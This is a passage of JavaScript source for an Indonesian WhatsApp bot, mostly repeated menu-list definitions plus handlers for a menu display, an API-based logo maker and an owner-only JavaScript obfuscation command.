    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'bugmenu':
case 'bugmenubutton': {
let teks =`┏『 *\`乂 ɪ s ʟ ᴀ ᴍ ɪ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}kisahnabi*
║◦ *${prefix}asmaulhusna*
║◦ *${prefix}bacaansholat*
║◦ *${prefix}audiosurah*
║◦ *${prefix}ayatkursi*
║◦ *${prefix}doaharian*
║◦ *${prefix}niatsholat*
║◦ *${prefix}quotesislami*
║◦ *${prefix}doatahlil*
║◦ *${prefix}tafsir*
║◦ *${prefix}jadwalsholat*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'buatlogo':
case 'blog': {
  if (!args[1]) return replyviex(`Contoh penggunaan:\n${prefix + command} Udin Offc\n\nGunakan 2 kata: text kiri dan text kanan.`)

  let [textL, textR] = args;
  let apiUrl = `https://api.nekorinn.my.id/maker/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;

  try {
const axios = require('axios');
    let res = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    let buffer = Buffer.from(res.data, 'binary');

    await TradzSigma.sendMessage(m.chat, {
      image: buffer,
      caption: `Berhasil membuat logo dengan teks:\nKiri: ${textL}\nKanan: ${textR}`
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Gagal mengambil data dari API. Coba lagi nanti.');
  }
}
break
case "enchard":
case "encrypthard": {
    if (!TradID) return replyviex('khusus owner')
    if (!m.quoted) return replyviex("Reply file .js")
    if (!/javascript|text/.test(mime)) return replyviex("Reply file .js")

    let media = await m.quoted.download()
    if (!media) return replyviex("Gagal download file.")

    let filename = m.quoted.message.documentMessage.fileName || 'file.js'
    let safeFilename = filename.replace(/[^a-zA-Z0-9_.-]/g, '')
    let tmpPath = `./@hardenc-${safeFilename}`

    fs.writeFileSync(tmpPath, media)
    m.reply("Memproses encrypt hard code . . .")

    JsConfuser.obfuscate(fs.readFileSync(tmpPath).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function() {
            const originalString = "/*DinzID/*^/*($break)*/" + "/*DinzID/*^/*($break)*/"
            function hapusKarakterTidakDiinginkan(input) {
                return input.replace(/[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, '')
            }
            function stringAcak(panjang) {
                let hasil = ''
                const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
                for (let i = 0; i < panjang; i++) {
                    hasil += karakter.charAt(Math.floor(Math.random() * karakter.length))
                }
                return hasil
            }
            return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2)
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: 0.01,
        stringSplitting: 0.1,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: true,
        shuffle: {
            hash: false,
            true: false
        },
        stack: false,
        controlFlowFlattening: false,
        opaquePredicates: false,
        deadCode: false,
        dispatcher: false,
        rgf: false,
        calculator: false,
        hexadecimalNumbers: false,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async (obfuscated) => {
        fs.writeFileSync(tmpPath, obfuscated)
        await TradzSigma.sendMessage(m.chat, {
            document: fs.readFileSync(tmpPath),
            mimetype: "application/javascript",
            fileName: filename,
            caption: "Encrypt File JS Sukses! Type:\nString"
        }, { quoted: m })
        fs.unlinkSync(tmpPath)
    }).catch(e => {
        m.reply("Error :" + e)
        fs.unlinkSync(tmpPath)
    })
}
break
case 'pyterodactylemenubutton': {
  let DinzID_sad = `${pyterodactylemenu(prefix, hituet)}`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `allmenubutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `donasibutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `groupmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `gamemenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `beritamenubutton`, 
          },
          {
            title: "ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `cpanelmenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `primbonmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `downloadmenubutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `aimenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `animemenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `ephoto360menubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `funmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `islamimenubutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `othermenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `rpgmenubutton`, 
          },
          {
            title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `anonymousmenubutton`, 
          },
          {
            title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `randomvideomenubutton`, 
          },
          {
            title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `randomphotomenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
